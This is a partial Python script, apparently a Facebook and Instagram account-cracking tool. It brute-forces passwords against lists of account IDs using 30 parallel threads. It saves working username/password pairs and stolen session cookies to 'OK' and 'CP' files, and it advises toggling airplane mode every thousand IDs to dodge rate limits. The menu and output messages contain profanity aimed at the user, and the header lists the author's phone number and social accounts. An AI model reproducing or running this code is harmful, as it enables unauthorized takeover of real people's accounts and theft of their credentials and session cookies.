...
"""%s
 ...
 - author      : Amna
 - facebook    : facebook.com/Subhankhan4.94
 - fanspage    : facebook.com/100070763477860
 - Whatsapp     : +923189339494
 - github      : github.com/SubhanXKhan
...
def banner():
	print (''' %s 
 © Group%s \n _____ _    _ ____  _    _          _   _\n /____| |  | |  _ \| |  | |   /\   | \ | |%s> %sZona \n | (___ | |  | | |_) | |__| |  /  \  |  \| | %s> %sAkun \n\___ \| |  | |  _ <|  __  | / /\ \ | . ` | %s>%s Facebook [Meta] \n\__/\___/\_____/\/ /_/\_/ \_/\_\ \/%s>%s Pakistan \n %s[%s*%s] By : %sSubhan Khan \n%s[%s*%s] -------------------------------------- \n [%s*%s] IP : %s%s'''%
...
def masuk():
    ...
    if rom in(""):
        ...
        if nanya in(""):
        	...
        	print ("\n%s [!] anda sungguh tolol "%(M));jeda(2);os.system("xdg-open https://www.youtube.com/channel/UCIr5BTdLhltQgW3QQND_H9w");masuk()
    elif rom in ('0', '00'):
    	exit('\n')
    else:
    	print("%s [!] Isi yang benar kentod "%(M));exit()
...
class ngentod:
    ...
    def langsung(self):
        ...
        if suuu == '':
            ...
            print '\n %s[%s*%s] akun %sOK%s tersimpan di >%a Amna/OK-%s-%s-%s.txt'%(P,K,P,H,P,H,ha, op, ta);jeda(0.2)
            print '%s [%s*%s] akun %sCP %stersimpan di > %aAmna/CP-%s-%s-%s.txt'%(P,K,P,K,P,K,ha, op, ta);jeda(0.2)
            print '%s [%s!%s] setiap crack 1k ID, gunakan mode pesawat 2 detik\n'%(P,M,P);jeda(0.2)
            with ThreadPoolExecutor(max_workers=30) as log:
            	for akun in self.id: 
                    try:
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                try:
                    ...
                    print '\r %s*--> %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    cp.append("%s ◊ %s ◊ %s %s %s"% (user,pw,day,month,year))
                    open('Amna/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s %s %s\n"%(user,pw,day,month,year))
                    break
                except KeyError:
                    day = ''
                    month   = ''
                ...
                print '\r %s*--> %s ◊ %s            ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('Amna/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
    ...
    def mobil(self, user, zona):
        ...
        for pw in zona:
            ...
            if "c_user" in ses.cookies.get_dict().keys():
                ...
                print '\r %s*--> %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
                ok.append("%s ◊ %s ◊ %s"% (user,pw,kuki))
                open('Amna/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s ◊ %s\n"%(user,pw,kuki))
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                ...
                print '\r %s*--> %s ◊ %s              ' % (K,user,pw)
                cp.append("%s ◊ %s"% (user,pw))
                open('Subhan/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" *--> %s ◊ %s\n"%(user,pw))
                break
                continue
        loop += 1
        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
...
def menu():
    ...
    if unik == '':
    	...
    	print "\n%s [01] Amna crack akun facebook "%(P)
        print "%s [02] Amna crack akun instagram "%(P)
        c = raw_input('\n%s [?] Menu : %s'%(P,K))
    	hasill(c)
    elif unik in['8','08']:
